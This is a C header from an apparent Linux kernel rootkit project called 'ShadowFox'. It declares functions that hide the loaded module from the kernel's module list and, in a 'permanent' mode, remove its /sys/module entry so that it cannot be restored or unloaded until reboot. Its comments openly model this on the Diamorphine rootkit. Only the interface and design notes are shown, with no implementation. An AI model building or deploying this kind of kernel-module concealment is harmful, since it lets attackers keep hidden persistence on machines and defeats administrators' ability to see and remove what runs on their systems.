/* SPDX-License-Identifier: GPL-2.0 */
#ifndef _SHADOWFOX_HIDE_MODULE_H
#define _SHADOWFOX_HIDE_MODULE_H

#include <linux/types.h>

/*
 * Module-list concealment API.
 *
 * sf_hide(false) unlinks THIS_MODULE from the kernel's "modules"
 * linked list only. /sys/module/<name> stays visible. sf_restore()
 * reverses this fully.
 *
 * sf_hide(true) additionally removes /sys/module/<name> via
 * kobject_del(). Because the kobject's child entries (sections/,
 * holders/, parameters/) are built by the kernel's module loader and
 * cannot be re-created from out-of-tree code, the permanent variant
 * has no restore: sf_restore() returns -EPERM thereafter and the
 * module is unloadable until reboot. This mirrors the Diamorphine
 * stance — once concealed, stays concealed.
 *
 * Both entry points are idempotent — calling hide on an already-
 * hidden module or restore on an already-visible module returns 0
 * without action.
 *
 * Must be called in process context (both functions sleep). Both
 * acquire module_mutex internally; callers must not hold it.
 *
 * Pre-condition: sf_symbols_init() has succeeded.
 *
 * Returns 0 on success or a negative errno on failure.
 */
int sf_hide(bool permanent);
int sf_restore(void);

bool sf_is_hidden(void);

#endif /* _SHADOWFOX_HIDE_MODULE_H */
